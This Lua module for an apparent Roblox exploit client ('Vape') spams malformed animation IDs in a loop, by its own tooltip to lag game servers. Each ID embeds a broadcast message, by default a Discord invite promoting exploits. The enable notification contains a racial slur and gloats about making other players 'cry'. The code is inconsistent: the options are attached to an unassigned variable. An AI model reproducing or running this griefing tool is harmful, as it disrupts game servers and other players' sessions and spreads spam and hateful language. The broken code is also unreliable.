local UniversalBroadcast
local Message
local Delay

local DEFAULT_MESSAGE = 'join https://discord.gg/bMZ4BSUR47 get better exploits or have fun :v'
local animation

UniversalLagger = vape.Categories.World:CreateModule({
	Name = 'UniversalBroadcast',
	Function = function(callback)
		if callback then
			local random = Random.new()
			local animator, track

			notif('UniversalLagger', 'watch them cry nigga its fun :v', 5)

			while UniversalLagger.Enabled and vape.Loaded ~= nil do
				local character = lplr.Character

				-- only search for the animator again after a respawn
				if character and (not animator or not animator:IsDescendantOf(character)) then
					animator = character:FindFirstChildWhichIsA('Animator', true)
					track = nil
				end

				if animator then
					-- the animation is reused and the previous track is destroyed,
					-- otherwise they pile up every frame and drop the local fps
					animation = animation or Instance.new('Animation')
					animation.AnimationId = 'http=507770677\1'..random:NextInteger(1, 1000000)..'\n \n'..(Message.Value ~= '' and Message.Value or DEFAULT_MESSAGE)..'\n \n'

					local old = track
					track = animator:LoadAnimation(animation)
					track:Play(0, 0.0001, 0)

					if old then
						old:Destroy()
					end
				end

				task.wait(Delay.Value)
			end

			if track then
				track:Destroy()
			end

			if animation then
				animation:Destroy()
				animation = nil
			end
		end
	end,
	Tooltip = 'Spams broken animations to lag the server'
})

Message = UniversalBroadcast:CreateTextBox({
	Name = 'Message',
	Placeholder = 'Message',
	Tooltip = 'leave it blank to use preset'
})

Delay = UniversalBroadcast:CreateSlider({
	Name = 'Delay',
	Min = 0.05,
	Max = 1,
	Default = 0.2,
	Decimal = 100,
	Suffix = 's',
	Tooltip = 'Time between each animation, lower = more lag but also more local fps loss'
})
